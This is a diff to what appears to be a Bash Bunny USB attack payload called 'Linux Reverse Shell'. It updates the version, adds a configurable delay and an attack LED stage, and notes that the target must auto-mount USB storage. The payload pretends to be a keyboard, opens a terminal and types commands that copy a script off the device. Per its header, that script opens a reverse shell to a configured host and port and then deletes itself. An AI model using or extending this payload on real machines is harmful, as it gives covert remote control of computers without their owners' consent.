@@ -2,9 +2,10 @@
 #
 # Title:         Linux Reverse Shell
 # Author:        tuzzmaniandevil
-# Version:       1.2
+# Version:       1.3
 #
 # Runs a script in the background that creates a reverse shell connection to the configured address and then removes itself.
+# This requires the host to automatically mount the USB as soon as it is plugged in since it is a storage-based attack.
 #
 # Magenta..................Setup
 # Yellow single blink......Executing
@@ -13,6 +14,9 @@
 # Config options
 RHOST=127.0.0.1
 RPORT=4444
+
+# The delay for how long you think it might take for the terminal to open
+DELAY=3
 
 # Start Setup
 LED SETUP
@@ -26,12 +30,14 @@ ATTACKMODE HID STORAGE
 # Get the switch position
 GET SWITCH_POSITION
 
+# We are attacking
+LED ATTACK
+
 # Open a terminal
 Q CTRL-ALT t
 
 # Wait for terminal to open
-sleep 1
-LED STAGE1
+sleep $DELAY
 
 # Copy bash script
 Q STRING "cp \$(readlink -f /dev/disk/by-label/BashBunny | while read dev;do mount | grep \"\$dev\b\" | awk '{print \$3}';done)/payloads/"
